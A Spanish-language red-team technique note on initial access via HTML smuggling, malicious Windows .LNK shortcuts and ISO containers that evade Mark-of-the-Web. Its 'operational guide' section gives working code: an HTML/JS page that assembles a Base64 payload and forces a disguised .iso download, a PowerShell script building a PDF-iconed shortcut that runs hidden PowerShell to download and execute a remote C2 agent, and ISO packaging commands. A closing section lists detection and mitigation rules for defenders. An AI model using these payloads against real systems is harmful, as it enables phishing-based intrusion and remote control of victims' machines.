---
tags: [red_team, initial_access, payload_delivery, html_smuggling, lnk_abuse, motw_bypass]
---


## 🎯 1. Concepto Técnico y Mecánica
El éxito de una operación de acceso inicial depende de la capacidad de entregar un ejecutable o script en el endpoint objetivo sin ser interceptado por las pasarelas de seguridad de correo (*Secure Email Gateways* - SEG) ni bloqueado por el sistema operativo mediante el identificador **Mark-of-the-Web (MOTW)**.

### A. HTML Smuggling
Es una técnica de evasión donde el archivo malicioso no se descarga a través de una red externa durante la navegación, sino que **se construye localmente en el navegador de la víctima** utilizando funcionalidades legítimas de HTML5 y JavaScript (`Blob`, `Data URIs`, `URL.createObjectURL`).
* **Mecánica de Evasión:** Las pasarelas de correo y WAFs analizan el archivo HTML entrante como texto/código JavaScript estándar sin detectar firmas de ejecutables. Al abrirse el archivo en el navegador objetivo, el script ensambla los bytes decodificados en memoria y simula un clic para descargar el ejecutable en el disco local de la víctima.

### B. Abuso de Archivos de Acceso Directo (.LNK)
Los archivos `.LNK` de Windows permiten asociar iconos legítimos (documentos PDF, carpetas, imágenes) con líneas de comando complejas que ejecutan binarios nativos del sistema operativo (*Living off the Land Binaries* - Lolbas) como `cmd.exe`, `powershell.exe`, `mshta.exe` o `rundll32.exe`.

### C. Evasión de Mark-of-the-Web (MOTW)
MOTW es una característica de seguridad de NTFS (mediante el Alternate Data Stream `Zone.Identifier`) que etiqueta archivos descargados de Internet. Si un usuario intenta ejecutar un archivo con MOTW, Windows bloquea la ejecución de macros o despliega advertencias de SmartScreen.
* **Mecánica de Bypass:** Contenedores de archivos como `.ISO`, `.VHD` o `.ZIP` (bajo ciertos descompresores) no preservan el Alternate Data Stream de MOTW para los archivos extraídos o montados en sistemas de archivos virtuales que no son NTFS.

---

## 🛠️ 2. Guía de Ejecución y Explotación Operativa

### Paso 1: Generación de Payload en HTML Smuggling
Creación de una plantilla HTML/JS que reconstruye un archivo malicioso (ej. un archivo `.LNK` o `.ISO`) mediante un array de bytes codificado en Base64:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Visualización de Documento Confidencial</title>
</head>
<body>
    <h3>Cargando documento corporativo... Por favor espere.</h3>
    <script>
        // Array de bytes del payload codificado en Base64 (ejemplo: ISO o LNK)
        var fileBase64 = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...";
        
        function base64ToArrayBuffer(base64) {
            var binaryString = window.atob(base64);
            var len = binaryString.length;
            var bytes = new Uint8Array(len);
            for (var i = 0; i < len; i++) {
                bytes[i] = binaryString.charCodeAt(i);
            }
            return bytes.buffer;
        }

        var fileBuffer = base64ToArrayBuffer(fileBase64);
        var blob = new Blob([fileBuffer], {type: "application/octet-stream"});
        var fileName = "Documento_Actualización_2026.iso";

        // Forzar la descarga en el cliente mediante un enlace invisible
        var a = document.createElement("a");
        document.body.appendChild(a);
        a.style = "display: none";
        var url = window.URL.createObjectURL(blob);
        a.href = url;
        a.download = fileName;
        a.click();
        window.URL.revokeObjectURL(url);
    </script>
</body>
</html>
````

### Paso 2: Creación de Archivo LNK Malicioso (PowerShell / Lnk2Attachment)

Generación de un acceso directo `.LNK` que invoca una PowerShell oculta para ejecutar una carga útil remota o desplegar la baliza C2:

  

```PowerShell
# Script de PowerShell para construir un acceso directo malicioso (.LNK)
$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut =$WScriptShell.CreateShortcut("C:\Payloads\Factura_Pendiente.lnk")

# Comando LOLBAS a ejecutar en segundo plano
$Shortcut.TargetPath = "C:\Windows\System32\cmd.exe"
$Shortcut.Arguments = "/c start /min powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"IEX (New-Object Net.WebClient).DownloadString('[http://10.10.10.5/c2_agent.ps1](http://10.10.10.5/c2_agent.ps1)')`""

# Asignar un icono legítimo de archivo PDF almacenado en la shell de Windows
$Shortcut.IconLocation = "C:\Windows\System32\shell32.dll, 1"
$Shortcut.WindowStyle = 7 # Minimizado
$Shortcut.Save()
```

### Paso 3: Empaquetado en Contenedor ISO para Bypass de MOTW

Empaquetado del archivo `.LNK` dentro de una imagen `.ISO` para evitar el etiquetado `Zone.Identifier` cuando la víctima monte el archivo en Windows 11:

  
```Bash
# Crear directorio con el LNK y el DLL/Payload complementario
mkdir /tmp/payload_iso
cp Factura_Pendiente.lnk /tmp/payload_iso/
cp agent.dll /tmp/payload_iso/

# Generar archivo ISO con genisoimage / mkisofs
genisoimage -V "FACTURA_2026" -o Factura_Pendiente.iso /tmp/payload_iso/
```

## 🛡️ 3. Detección, Telemetría y Mitigación (Blue Team)

- **Monitoreo de Creación de Procesos (Sysmon Event ID 1):**
    
      
    - Alertar cuando `cmd.exe` o `powershell.exe` sean engendrados directamente desde ejecutables de almacenamiento o montaje como `explorer.exe` (al hacer doble clic en un `.LNK` dentro de un `.ISO` montado).
        
          
        
    - Monitorear llamadas a `powershell.exe` que contengan argumentos de evasión como `-WindowStyle Hidden`, `-ExecutionPolicy Bypass` o invocaciones directas a `Net.WebClient`.
        
          
        
- **Protección de Red y Endpoints (EDR / ASR):**
    
      
    - **Reglas de Attack Surface Reduction (ASR):** Activar la regla de Microsoft Defender `Block executable files from running unless they meet a prevalence, age, or trusted list criterion` y `Block Adobe Reader from creating child processes`.
        
          
        
    - Regla ASR específica: _Block process creations originating from PSExec and WMI commands_ y _Block child processes of Office apps_.
        
          
        
- **Mitigación en Gateways:**
    
      
    - Bloquear la entrada por correo de extensiones de contenedores no habituales (`.ISO`, `.IMG`, `.VHD`, `.XZ`).
        
          
        
    - Inspeccionar código JavaScript entrante en correos mediante inspección SSL/TLS buscando el patrón `URL.createObjectURL` o decodificación masiva de `atob()`.